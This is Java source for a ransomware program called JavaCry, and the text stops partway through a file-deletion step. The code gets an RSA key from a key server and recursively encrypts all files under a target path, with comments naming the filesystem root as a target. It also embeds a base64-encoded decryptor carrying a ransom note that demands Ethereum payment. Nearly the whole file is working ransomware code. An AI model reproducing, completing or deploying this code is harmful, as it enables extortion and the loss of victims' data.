import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.*;
import java.security.MessageDigest;
import java.security.spec.X509EncodedKeySpec;
import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import java.nio.file.StandardCopyOption;
;




public class JavaCry {
    /*
   Dangerous target paths:
   Mac & Linux:
   private static String targetPath = "/";

   Windows:
   private static String targetPath = "C:\";
 */
    private static String addr="127.0.0.1";
    private static String targetPath="/Users/daniel/Desktop/java_practice/JavaCry/Test_Env";
    private static String os=System.getProperty("os.name").split(" ")[0];
    private static List<Path>files=new ArrayList<Path>();
    private static Random rand=new Random(System.currentTimeMillis());
    private static int id=(int)(rand.nextInt(Integer.MAX_VALUE));
    private static RSACrypt crypto;
    private static String decryptorPayload="aW1wb3J0IGphdmEuYXd0Lio7CmltcG9ydCBqYXZheC5zd2luZy4qOwppbXBvcnQgamF2YXguc3dpbmcuYm9yZGVyLio7CmltcG9ydCBqYXZhLmF3dC5ldmVudC4qOwppbXBvcnQgamF2YS5hd3QuQ29sb3I7CgppbXBvcnQgamF2YS51dGlsLio7CmltcG9ydCBqYXZhLm5ldC4qOwppbXBvcnQgamF2YS5pby4qOwppbXBvcnQgamF2YS5pby5GaWxlT3V0cHV0U3RyZWFtOwppbXBvcnQgamF2YS51dGlsLnN0cmVhbS5Db2xsZWN0b3JzOwppbXBvcnQgamF2YS5uaW8uZmlsZS5GaWxlczsKaW1wb3J0IGphdmEubmlvLmZpbGUuUGF0aDsKaW1wb3J0IGphdmEubmlvLmZpbGUuUGF0aHM7CmltcG9ydCBqYXZhLmlvLkZpbGVJbnB1dFN0cmVhbTsKaW1wb3J0IGphdmEuaW8uRmlsZU91dHB1dFN0cmVhbTsKaW1wb3J0IGphdmEuc2VjdXJpdHkuU2VjdXJlUmFuZG9tOwppbXBvcnQgamF2YXguY3J5cHRvLkNpcGhlcjsKaW1wb3J0IGphdmF4LmNyeXB0by5LZXlHZW5lcmF0b3I7CmltcG9ydCBqYXZheC5jcnlwdG8uU2VjcmV0S2V5OwppbXBvcnQgamF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYzsKaW1wb3J0IGphdmF4LmNyeXB0by5zcGVjLkl2UGFyYW1ldGVyU3BlYzsKaW1wb3J0IGphdmEudXRpbC5CYXNlNjQ7CmltcG9ydCBqYXZhLm5pby5maWxlLlBhdGg7CmltcG9ydCBqYXZhLm5pby5maWxlLlBhdGhzOwppbXBvcnQgamF2YS51dGlsLnN0cmVhbS5TdHJlYW07CgppbXBvcnQgamF2YS5zZWN1cml0eS4qOwppbXBvcnQgamF2YS5zZWN1cml0eS5JbnZhbGlkS2V5RXhjZXB0aW9uOwppbXBvcnQgamF2YXguY3J5cHRvLkJhZFBhZGRpbmdFeGNlcHRpb247CmltcG9ydCBqYXZheC5jcnlwdG8uSWxsZWdhbEJsb2NrU2l6ZUV4Y2VwdGlvbjsKaW1wb3J0IGphdmEuc2VjdXJpdHkuc3BlYy5QS0NTOEVuY29kZWRLZXlTcGVjOwoKLyoKICAgZGVjcnlwdG9yOgogICBCVEMgcGF5bWVudCBpbnRlcmZhY2UKICAgUmVxdWVzdCBmb3IgZGVjcnlwdGlvbiBmdW5jdGlvbmFsaXR5CiAgIGlmIHJlY2VpdmVzIHRoZSBrZXksIHVzZSB0aGUga2V5IHRvIGRlY3J5cHQgdGhlIGZpbGVzCiAgIGRlc3Ryb3kgZGVjcnlwdG9yLmphdmEKICovCgpwdWJsaWMgY2xhc3MgRGVjcnlwdG9yIHsKICBwcml2YXRlIHN0YXRpYyBpbnQgaWQgPSA4MjM3ODAyNjM7CgogIC8vIG5ldHdvcmsgc2V0dGluZ3MKICBwcml2YXRlIHN0YXRpYyBTdHJpbmcgYWRkcmVzcyA9ICIxMjcuMC4wLjEiOwogIHByaXZhdGUgaW50IHBvcnQgPSA1NTU1OwoKICAvLyBzb2NrZXQgdmFyaWFibGVzCiAgcHJpdmF0ZSBTb2NrZXQgc29ja2V0OwogIHByaXZhdGUgRGF0YU91dHB1dFN0cmVhbSBvdXQgICAgID0gbnVsbDsKICBwcml2YXRlIERhdGFJbnB1dFN0cmVhbSBpbiAgICAgPSBudWxsOwoKICAvLyBjcnlwdCBzZXR0aW5ncwogIHByaXZhdGUgc3RhdGljIFN0cmluZyB0YXJnZXRQYXRoID0gIi9Vc2Vycy9kYW5pZWwvRGVza3RvcC9qYXZhX3ByYWN0aWNlL0phdmFDcnkvVGVzdF9FbnYiOwogIHByaXZhdGUgU3RyaW5nIGI2NHByaXZrZXk7CiAgcHJpdmF0ZSBQcml2YXRlS2V5IHByaXZhdGVfa2V5OwogIHByaXZhdGUgQ2lwaGVyIFJTQV9DaXBoZXI7CiAgcHJpdmF0ZSBDaXBoZXIgQUVTX0NpcGhlcjsKICBwcml2YXRlIHN0YXRpYyBqYXZhLnV0aWwuTGlzdDxQYXRoPiBmaWxlcyA9IG5ldyBBcnJheUxpc3Q8UGF0aD4oKTsKICAKICBwcml2YXRlIENsaWVudFRocmVhZCBiYWNrZW5kOwoKICBwdWJsaWMgRGVjcnlwdG9yKCkgewoKICAgICAgU3RyaW5nIG5vdGUgPSBTdHJpbmcuam9pbigiXG4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiPGh0bWw+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8aDEgc3R5bGUgPSAnZm9udC1zaXplOiAzMnB4OyBwYWRkaW5nOiAxMHB4IDEwcHg7IGNvbG9yOiByZ2IoMjU1LDI1NSwyNTUpOyc+WW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkLjwvaDE+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjxwIHN0eWxlID0gJ3BhZGRpbmc6IDEwcHggMTBweDtjb2xvcjogcmdiKDI1NSwyNTUsMjU1KTsnPiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJZb3VyIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQuIElmIHlvdSB3YW50IHRvIGRlY3J5cHQgeW91ciBmaWxlcywgcGxlYXNlIGNvcHkgdGhlIGNvbnRlbnQgb2Ygc2VuZHRvbWUudHh0IHNlbmQgaXQgd2l0aCAkMSBFVEggdG8gW015IEFkZHJlc3NdLiBZb3UgY2FuIGZvbGxvdyB0aGlzIHR1dG9yaWFsIHRvIHNlbmQgbWUgbW9uZXk6IGh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL3dhdGNoP3Y9RXd4UHFic2VGckUuIEkgd2lsbCBjaGVjayB0aGUgcGF5bWVudHMgYmVmb3JlIEkgYXBwcm92ZSB5b3VyIHJlcXVlc3QgZm9yIGRlY3J5cHRpb24uIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjwvcD4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiPHAgc3R5bGUgPSAncGFkZGluZzogMTBweCAxMHB4O2NvbG9yOiByZ2IoMjU1LDI1NSwyNTUpOyc+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjxicj48Yj5Eb27igJl0IGRlbGV0ZSBvciBtb2RpZnkgYW55IGNvbnRlbnQgaW4gS2V5X3Byb3RlY3RlZC5rZXksIG9yIHlvdSB3aWxsIGxvc2UgeW91ciBhYmlsaXR5IHRvIGRlY3J5cHQgeW91ciBmaWxlcy48L2I+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjwvcD4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiPHAgc3R5bGUgPSAncGFkZGluZzogMTBweCAxMHB4O2NvbG9yOiByZ2IoMjU1LDI1NSwyNTUpOyc+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjxicj5JZiB5b3Ugd2FudCB0byBvcGVuIHRoaXMgd2luZG93IGFnYWluLCBwbGVhc2UgcnVuIERlY3J5cHRvci5qYXIuPGJyPiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8L3A+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjwvaHRtbD4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKCgogICAgICBKRnJhbWUgZiA9IG5ldyBKRnJhbWUoKTsKICAgICAgSlBhbmVsIHBhbmVsID0gbmV3IEpQYW5lbCgpOwogICAgICBKUGFuZWwgcGFuZWwyID0gbmV3IEpQYW5lbCgpOwogICAgICBKTGFiZWwgaHRtbCA9IG5ldyBKTGFiZWwoKTsKICAgICAgSkJ1dHRvbiBiID0gbmV3IEpCdXR0b24oIlJlcXVlc3QgZm9yIERlY3J5cHRpb24iKTsKICAgICAgSkxhYmVsIHN0YXR1cyA9IG5ldyBKTGFiZWwoIiIpOwogICAgICBVUkwgdXJsID0gRGVjcnlwdG9yLmNsYXNzLmdldFJlc291cmNlKCJsb2FkaW5nLmdpZiIpOwogICAgICBJbWFnZUljb24gaW1hZ2VJY29uID0gbmV3IEltYWdlSWNvbih1cmwpOwogICAgICBKTGFiZWwgbG9hZGluZyA9IG5ldyBKTGFiZWwoaW1hZ2VJY29uKTsKCgogICAgICBodG1sLnNldFRleHQobm90ZSk7CiAgICAgIGh0bWwuc2V0QWxpZ25tZW50WChDb21wb25lbnQuQ0VOVEVSX0FMSUdOTUVOVCk7CiAgICAgIGIuc2V0QWxpZ25tZW50WChDb21wb25lbnQuQ0VOVEVSX0FMSUdOTUVOVCk7CiAgICAgIHN0YXR1cy5zZXRBbGlnbm1lbnRYKENvbXBvbmVudC5DRU5URVJfQUxJR05NRU5UKTsKICAgICAgc3RhdHVzLnNldEFsaWdubWVudFkoQ29tcG9uZW50LkJPVFRPTV9BTElHTk1FTlQpOwogICAgICBzdGF0dXMuc2V0SG9yaXpvbnRhbEFsaWdubWVudChKTGFiZWwuQ0VOVEVSKTsKICAgICAgc3RhdHVzLnNldEZvbnQobmV3IEZvbnQoRm9udC5NT05PU1BBQ0VELCBGb250LlBMQUlOLCAxNCkpOwogICAgICBwYW5lbDIuc2V0QmFja2dyb3VuZChuZXcgQ29sb3IoNTAsIDAsIDApKTsKCiAgICAgIGIuYWRkQWN0aW9uTGlzdGVuZXIobmV3IEFjdGlvbkxpc3RlbmVyKCkgewoKICAgICAgICAgICAgICAgICAgICAgIEBPdmVycmlkZQogICAgICAgICAgICAgICAgICAgICAgcHVibGljIHZvaWQgYWN0aW9uUGVyZm9ybWVkKEFjdGlvbkV2ZW50IGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgYmFja2VuZCA9IG5ldyBDbGllbnRUaHJlYWQoYWRkcmVzcywgcG9ydCwgaWQsIHN0YXR1cywgYiwgbG9hZGluZyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGJhY2tlbmQuc3RhcnQoKTsKICAgICAgICAgICAgICAgICAgICAgIH0KICAgIH0pOwoKICAgIGYuc2V0TGF5b3V0KG5ldyBHcmlkTGF5b3V0KDAsMSkpOwogICAgcGFuZWwuc2V0TGF5b3V0KG5ldyBCb3hMYXlvdXQocGFuZWwsIEJveExheW91dC5ZX0FYSVMpKTsKICAgIHBhbmVsLmFkZChodG1sKTsKICAgIHBhbmVsLmFkZChiKTsKICAgIHBhbmVsLnNldEJhY2tncm91bmQobmV3IENvbG9yKDUwLCAwLCAwKSk7CiAgICBmLmFkZChwYW5lbCk7CiAgICBwYW5lbDIuc2V0TGF5b3V0KG5ldyBHcmlkTGF5b3V0KDAsMSkpOwogICAgcGFuZWwyLmFkZChzdGF0dXMpOwogICAgcGFuZWwyLmFkZChsb2FkaW5nKTsKICAgIGxvYWRpbmcuc2V0VmlzaWJsZShmYWxzZSk7CiAgICBmLmFkZChwYW5lbDIpOwogICAgLy8gZi5hZGQobmV3IEpCdXR0b24oIkJ1dHRvbiAxIikpOwogICAgLy8gZi5hZGQobmV3IEpCdXR0b24oIkJ1dHRvbiAyIikpOwoKICAgIGYuc2V0VGl0bGUoIkphdmFDcnkgRGVjcnlwdG9yIik7CiAgICBmLnNldERlZmF1bHRDbG9zZU9wZXJhdGlvbihKRnJhbWUuRVhJVF9PTl9DTE9TRSk7CiAgICBmLnNldExvY2F0aW9uUmVsYXRpdmVUbyhudWxsKTsKICAgIGYuc2V0RXh0ZW5kZWRTdGF0ZShKRnJhbWUuTUFYSU1JWkVEX0JPVEgpOwogICAgZi5wYWNrKCk7CiAgICBmLnNldFZpc2libGUodHJ1ZSk7CiAgICBodG1sLnNldEZvbnQobmV3IEZvbnQoRm9udC5TQU5TX1NFUklGLCBGb250LlBMQUlOLCAxOCkpOwogICAgYi5zZXRGb250KG5ldyBGb250KCJBcmlhbCIsIEZvbnQuUExBSU4sIDMwKSk7CiAgICBiLnNldEJhY2tncm91bmQoQ29sb3IuUkVEKTsKICAgIGIuc2V0Rm9yZWdyb3VuZChDb2xvci5XSElURSk7CiAgICBiLnNldE9wYXF1ZSh0cnVlKTsKCiAgICBzdGF0dXMuc2V0Rm9yZWdyb3VuZChDb2xvci5SRUQpOwogICAgYi5zZXRCb3JkZXIoQm9yZGVyRmFjdG9yeS5jcmVhdGVDb21wb3VuZEJvcmRlcigKICAgICAgQm9yZGVyRmFjdG9yeS5jcmVhdGVMaW5lQm9yZGVyKENvbG9yLlJFRCwgNSksCiAgICAgIEJvcmRlckZhY3RvcnkuY3JlYXRlTGluZUJvcmRlcihDb2xvci5CTEFDSywgMjApKSk7CiAgfQoKICBwdWJsaWMgc3RhdGljIFN0cmluZyBnZXRUYXJnZXRQYXRoKCkgewogICAgcmV0dXJuIHRhcmdldFBhdGg7CiAgfQoKCiAgLy8gbWFpbiBtZXRob2QKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKFN0cmluZyBhcmdzW10pIHsKCiAgLy8gY3JlYXRpbmcgaW5zdGFuY2Ugb2YgRnJhbWUgY2xhc3MKICAgICAgRGVjcnlwdG9yIGF3dF9vYmogPSBuZXcgRGVjcnlwdG9yKCk7CgogICAgICAKICAgIH0KCn0KCgoKY2xhc3MgQ2xpZW50VGhyZWFkIGV4dGVuZHMgVGhyZWFkIHsKICAgIHByaXZhdGUgU3RyaW5nIHN0YXRlOwogICAgcHJpdmF0ZSBzdGF0aWMgU3RyaW5nIHRhcmdldFBhdGg7CiAgICBwcml2YXRlIHN0YXRpYyBqYXZhLnV0aWwuTGlzdDxQYXRoPiBmaWxlcyA9IG5ldyBBcnJheUxpc3Q8UGF0aD4oKTsKICAgIHByaXZhdGUgU3RyaW5nIGI2NHByaXZrZXk7CiAgICBwcml2YXRlIFByaXZhdGVLZXkgcHJpdmF0ZV9rZXk7CiAgICBwcml2YXRlIENpcGhlciBSU0FfQ2lwaGVyOwogICAgcHJpdmF0ZSBDaXBoZXIgQUVTX0NpcGhlcjsKICAgIHByaXZhdGUgU29ja2V0IHNvY2tldDsKICAgIHByaXZhdGUgU3RyaW5nIGFkZHJlc3M7CiAgICBwcml2YXRlIEpMYWJlbCBzdGF0dXM7CiAgICBwcml2YXRlIEpMYWJlbCBsb2FkaW5nOwogICAgcHJpdmF0ZSBKQnV0dG9uIGJ1dHRvbjsKICAgIHByaXZhdGUgaW50IHBvcnQ7CiAgICBwcml2YXRlIGludCBpZDsKCiAgICBwdWJsaWMgQ2xpZW50VGhyZWFkKFN0cmluZyBhZGRyZXNzLCBpbnQgcG9ydCwgaW50IGlkLCBKTGFiZWwgc3RhdHVzLCBKQnV0dG9uIGJ1dHRvbiwgSkxhYmVsIGxvYWRpbmcpIHsKICAgICAgICBzdGF0ZSA9ICI8ZGVmPiI7CiAgICAgICAgdGFyZ2V0UGF0aCA9IERlY3J5cHRvci5nZXRUYXJnZXRQYXRoKCk7CiAgICAgICAgdGhpcy5wb3J0ID0gcG9ydDsKICAgICAgICB0aGlzLmFkZHJlc3MgPSBhZGRyZXNzOwogICAgICAgIHRoaXMuaWQgPSBpZDsKICAgICAgICB0aGlzLnN0YXR1cyA9IHN0YXR1czsKICAgICAgICB0aGlzLmxvYWRpbmcgPSBsb2FkaW5nOwogICAgICAgIHRoaXMuYnV0dG9uID0gYnV0dG9uOwogICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigiYmFja2VuZCBpbml0aWFsaXplZCIpOwogICAgfQoKCiAgICBwdWJsaWMgdm9pZCBydW4oKSB7CiAgICAgIHN0YXR1cy5zZXRUZXh0KCJXYWl0aW5nIGZvciBhcHByb3ZhbCIpOwogICAgICAKICAgICAgbG9hZGluZy5zZXRWaXNpYmxlKHRydWUpOwogICAgICBSZXF1ZXN0Rm9yRGVjcnlwdGlvbigpOwogICAgICBsb2FkaW5nLnNldFZpc2libGUoZmFsc2UpOwogICAgfQoKCiAgICBwdWJsaWMgdm9pZCBSZXF1ZXN0Rm9yRGVjcnlwdGlvbigpIHsKICAgICAgdHJ5CiAgICAgIHsKICAgICAgICAgIGJ1dHRvbi5zZXRFbmFibGVkKGZhbHNlKTsKICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigidHJ5aW5nIHRvIGNvbm5lY3QiKTsKICAgICAgICAgIHNvY2tldCA9IG5ldyBTb2NrZXQoYWRkcmVzcywgcG9ydCk7CiAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oImNvbm5lY3RlZCIpOwoKICAgICAgICAgIC8vIHNlbmRzIG91dHB1dCB0byB0aGUgc29ja2V0CiAgICAgICAgICBEYXRhSW5wdXRTdHJlYW0gaW4gPSBuZXcgRGF0YUlucHV0U3RyZWFtKHNvY2tldC5nZXRJbnB1dFN0cmVhbSgpKTsKICAgICAgICAgIERhdGFPdXRwdXRTdHJlYW0gb3V0ID0gbmV3IERhdGFPdXRwdXRTdHJlYW0oc29ja2V0LmdldE91dHB1dFN0cmVhbSgpKTsKCiAgICAgICAgICBvdXQud3JpdGVVVEYoU3RyaW5nLnZhbHVlT2YoaWQpKTsKICAgICAgICAgIGI2NHByaXZrZXkgPSBpbi5yZWFkVVRGKCk7CiAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oYjY0cHJpdmtleSk7CiAgICAgICAgICBpZiAoYjY0cHJpdmtleS5lcXVhbHMoImJ1dCBJIHJlZnVzZSIpKSB7CiAgICAgICAgICAgIHN0YXR1cy5zZXRUZXh0KCJZb3VyIHJlcXVlc3QgaGFzIGJlZW4gcmVqZWN0ZWQuIik7CiAgICAgICAgICAgIGJ1dHRvbi5zZXRFbmFibGVkKHRydWUpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgICB9CiAgICAgICAgICBieXRlW10gcHViID0gQmFzZTY0LmdldERlY29kZXIoKS5kZWNvZGUoYjY0cHJpdmtleSk7CiAgICAgICAgICBQS0NTOEVuY29kZWRLZXlTcGVjIHNwZWMgPSBuZXcgUEtDUzhFbmNvZGVkS2V5U3BlYyhwdWIpOwogICAgICAgICAgS2V5RmFjdG9yeSBmYWN0b3J5ID0gS2V5RmFjdG9yeS5nZXRJbnN0YW5jZSgiUlNBIik7CiAgICAgICAgICBwcml2YXRlX2tleSA9IGZhY3RvcnkuZ2VuZXJhdGVQcml2YXRlKHNwZWMpOwoKICAgICAgICAgIFJTQV9DaXBoZXIgPSBDaXBoZXIuZ2V0SW5zdGFuY2UoIlJTQSIpOwogICAgICAgICAgQUVTX0NpcGhlciA9IENpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7CiAgICAgICAgICB0cnkgKFN0cmVhbTxQYXRoPiBwYXRocyA9IEZpbGVzLndhbGsoUGF0aHMuZ2V0KHRhcmdldFBhdGgpKSkgewogICAgICAgICAgICAgICAgICBmaWxlcyA9IHBhdGhzLmZpbHRlcihGaWxlczo6aXNSZWd1bGFyRmlsZSkuY29sbGVjdChDb2xsZWN0b3JzLnRvTGlzdCgpKTsKICAgICAgICAgIH0KICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXJyKSB7CiAgICAgICAgICAgICAgICAgIDsKICAgICAgICAgIH0KICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgIGRlY3J5cHRGaWxlcygpOwogICAgICAgICAgICBzdGF0dXMuc2V0VGV4dCgiWW91ciByZXF1ZXN0IGhhcyBiZWVuIGFjY2VwdGVkLiIpOwogICAgICAgICAgICBidXR0b24uc2V0RW5hYmxlZCh0cnVlKTsKICAgICAgICAgIH0KICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXJyKSB7CiAgICAgICAgICAgIHN0YXR1cy5zZXRUZXh0KCJSZXF1ZXN0IGZhaWxlZC4iKTsKICAgICAgICAgICAgYnV0dG9uLnNldEVuYWJsZWQodHJ1ZSk7CiAgICAgICAgICB9CiAgICAgIH0KICAgICAgY2F0Y2goVW5rbm93bkhvc3RFeGNlcHRpb24gdSkKICAgICAgewogICAgICAgICAgc3RhdHVzLnNldFRleHQoIlJlcXVlc3QgZmFpbGVkLiIpOwogICAgICAgICAgYnV0dG9uLnNldEVuYWJsZWQodHJ1ZSk7CiAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4odSk7CiAgICAgIH0KICAgICAgY2F0Y2goSU9FeGNlcHRpb24gaSkKICAgICAgewogICAgICAgIHN0YXR1cy5zZXRUZXh0KCJSZXF1ZXN0IGZhaWxlZC4iKTsKICAgICAgICBidXR0b24uc2V0RW5hYmxlZCh0cnVlKTsKICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oaSk7CiAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlcnIpIHsKICAgICAgICBzdGF0dXMuc2V0VGV4dCgiUmVxdWVzdCBmYWlsZWQuIik7CiAgICAgICAgYnV0dG9uLnNldEVuYWJsZWQodHJ1ZSk7CiAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGVycik7CiAgICAgIH0KICAgIH0KCiAgICBwdWJsaWMgYnl0ZVtdIFJTQUNyeXB0KEZpbGUgZikgewogICAgICB0cnkgewogICAgICAgICAgRmlsZUlucHV0U3RyZWFtIGluID0gbmV3IEZpbGVJbnB1dFN0cmVhbShmKTsKICAgICAgICAgIGJ5dGVbXSBpbnB1dCA9IG5ldyBieXRlWyhpbnQpIGYubGVuZ3RoKCldOwogICAgICAgICAgaW4ucmVhZChpbnB1dCk7CiAgCiAgICAgICAgICBGaWxlT3V0cHV0U3RyZWFtIG91dCA9IG5ldyBGaWxlT3V0cHV0U3RyZWFtKGYpOwogICAgICAgICAgYnl0ZVtdIG91dHB1dCA9IFJTQV9DaXBoZXIuZG9GaW5hbChpbnB1dCk7CiAgCiAgICAgICAgICByZXR1cm4gb3V0cHV0OwogICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGUpOwogICAgICB9CiAgICAgIHJldHVybiBudWxsOwogICAgfQogIAogICAgcHVibGljIHZvaWQgQUVTQ3J5cHQoRmlsZSBmKSB7CiAgICAgIHRyeSB7CiAgICAgICAgICBGaWxlSW5wdXRTdHJlYW0gaW4gPSBuZXcgRmlsZUlucHV0U3RyZWFtKGYpOwogICAgICAgICAgYnl0ZVtdIGlucHV0ID0gbmV3IGJ5dGVbKGludCkgZi5sZW5ndGgoKV07CiAgICAgICAgICBpbi5yZWFkKGlucHV0KTsKICAKICAgICAgICAgIEZpbGVPdXRwdXRTdHJlYW0gb3V0ID0gbmV3IEZpbGVPdXRwdXRTdHJlYW0oZik7CiAgICAgICAgICBieXRlW10gb3V0cHV0ID0gQUVTX0NpcGhlci5kb0ZpbmFsKGlucHV0KTsKICAgICAgICAgIG91dC53cml0ZShvdXRwdXQpOwogIAogICAgICAgICAgb3V0LmZsdXNoKCk7CiAgICAgICAgICBvdXQuY2xvc2UoKTsKICAgICAgICAgIGluLmNsb3NlKCk7CiAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oIkRlY3J5cHRpbmcgZmlsZTogIiArIGYpOwogICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGUpOwogICAgICB9CiAgICB9CgogICAgcHVibGljIHZvaWQgZGVjcnlwdEZpbGVzKCkgdGhyb3dzIEV4Y2VwdGlvbiB7CiAgCiAgICAgIFJTQV9DaXBoZXIuaW5pdChDaXBoZXIuREVDUllQVF9NT0RFLCBwcml2YXRlX2tleSk7CiAgICAgIEZpbGUgayA9IG5ldyBGaWxlKCJLZXlfcHJvdGVjdGVkLmtleSIpOwogICAgICBieXRlW10gZGF0YSA9IFJTQUNyeXB0KGspOwogICAgICBTZWNyZXRLZXkgQUVTS2V5ID0gbmV3IFNlY3JldEtleVNwZWMoZGF0YSwgMCwgZGF0YS5sZW5ndGgsICJBRVMiKTsKICAgICAgQUVTX0NpcGhlci5pbml0KENpcGhlci5ERUNSWVBUX01PREUsIEFFU0tleSk7CiAgICAgIGZvciAoUGF0aCBwIDogZmlsZXMpIHsKICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgRmlsZSBmID0gcC50b0ZpbGUoKTsKICAgICAgICAgICAgICAgICAgICAgIEFFU0NyeXB0KGYpOwogICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZSk7CiAgICAgICAgICAgICAgfQogICAgICB9CiAgCiAgICB9Cn0KCgo=";
    private static Process process;
    private static List<String>avoidDir=new ArrayList<String>();

    // decrypt files from a list of paths
    public static void decryptFiles(String keyString) {
        crypto.setPubKey(keyString);

        for (Path p : files) {
            try {
                File f=p.toFile();
                crypto.decrypt(f);
            }

            catch (Exception e) {
                System.out.println(e);
            }
        }
    }

    // encrypt files from a list of paths
    public static void encryptFiles() {
        for (Path p : files) {
            try {
                File f=p.toFile();
                crypto.encrypt(f);
            }

            catch (Exception e) {
                System.out.println(e);
            }
        }
    }

    public static String replaceLine(String src, int lineno, String content) {
        String out="";
        String[] lines=src.split("\n");

        for (int i=0; i < lines.length; i++) {
            if (i+1==lineno) {
                out+=content+"\n";
            }

            else {
                out+=lines[i]+"\n";
            }
        }

        return out;
    }

    public static void main(String[] args) {
        System.out.println("You're on "+ os); // Windows Mac Linux SunOS FreeBSD
        String h=""; // id hash to write to sendtome.txt

        KeyClient key_client=new KeyClient(addr, 6666);

/*
=========================================================
                Send victim ID and get public key
=========================================================
*/

        if (key_client.getSuccess()) {

            try {
                // send id hash to server
                MessageDigest md=MessageDigest.getInstance("SHA-256");
                byte[] hash=md.digest(String.valueOf(id).getBytes(StandardCharsets.UTF_8));
                String b64hash=Base64.getEncoder().encodeToString(hash);
                h=b64hash;
                key_client.sendString(b64hash);

                // received allocated public key
                String b64pubkey=key_client.recvString();
                byte[] pub=Base64.getDecoder().decode(b64pubkey);
                X509EncodedKeySpec spec=new X509EncodedKeySpec(pub);
                KeyFactory factory=KeyFactory.getInstance("RSA");
                PublicKey public_key=factory.generatePublic(spec);

                crypto=new RSACrypt(public_key);

                key_client.close();
            }

            catch (Exception e) {
                System.out.println(1+""+e);
                return;
            }

/*
=========================================================
                Encrypting the files
=========================================================
*/

            avoidDir.add("windows");
            avoidDir.add("library");
            avoidDir.add("boot");
            avoidDir.add("local");
            avoidDir.add("program files");
            avoidDir.add("programdata");
            avoidDir.add("System");
            avoidDir.add("Volumes");
            avoidDir.add("dev");
            avoidDir.add("etc");
            avoidDir.add("bin");
            avoidDir.add("$");

            // list files recursively within the target directory
            try (Stream<Path> paths=Files.walk(Paths.get(targetPath))) {
                files=paths.filter(Files::isRegularFile).collect(Collectors.toList());
            }

            catch (Exception e) {
                ;
            }

            // avoid certain directories
            for (int i=0; i < files.size(); i++) {
                System.out.println(files.get(i));

                if (avoidDir.contains(files.get(i).toString())) {
                    files.remove(i);
                    i--;
                }
            }


            // This will encrypt files recursively in the target directory
            encryptFiles();

            // This will securely save the AES encryption key by encrypting it with the received RSA public key.
            crypto.SaveAESKey();

 /*
=========================================================
                Generating Decryptor.java
=========================================================
*/

            try {
                File f=new File("Decryptor.java");

                if ( !f.exists()) {
                    f.createNewFile();
                }

                File s=new File("sendtome.txt");

                if ( !s.exists()) {
                    s.createNewFile();
                }

                File m=new File("manifest.txt");

                if ( !m.exists()) {
                    m.createNewFile();
                }

                // create Decryptor.jar
                String code=new String(Base64.getDecoder().decode(decryptorPayload));
                code=replaceLine(code, 43, "private static int id = "+ String.valueOf(id) + ";");
                FileWriter writer=new FileWriter("Decryptor.java");
                PrintStream manifest=new PrintStream(new File("manifest.txt"));
                manifest.println("Main-Class: Decryptor");
                writer.write(code);
                writer.close();

                // create sendtome.txt
                writer=new FileWriter("sendtome.txt");
                writer.write(h);
                writer.close();

                // File loadingImg = new File("/img/loading.gif");
                InputStream imgStream = JavaCry.class.getResourceAsStream("/img/loading.gif");
                Files.copy(imgStream, Paths.get("loading.gif"), StandardCopyOption.REPLACE_EXISTING);

/*
=========================================================
                Compiling Decryptor.java
=========================================================
*/

                process=Runtime.getRuntime().exec(String.format("javac Decryptor.java", System.getProperty("user.home")));
                BufferedReader b=new BufferedReader(new InputStreamReader(process.getInputStream()));

                String str;

                while ((str=b.readLine()) !=null) {
                    System.out.println(str);
                }

                b.close();

                process=Runtime.getRuntime().exec(String.format("jar -cvmf manifest.txt Decryptor.jar Decryptor.class Decryptor$1.class ClientThread.class loading.gif", System.getProperty("user.home")));
                b=new BufferedReader(new InputStreamReader(process.getInputStream()));

                while ((str=b.readLine()) !=null) {
                    System.out.println(str);
                }

                b.close();
/*
=========================================================
                Deleting the files
=========================================================
*/


                if (f.delete()) {
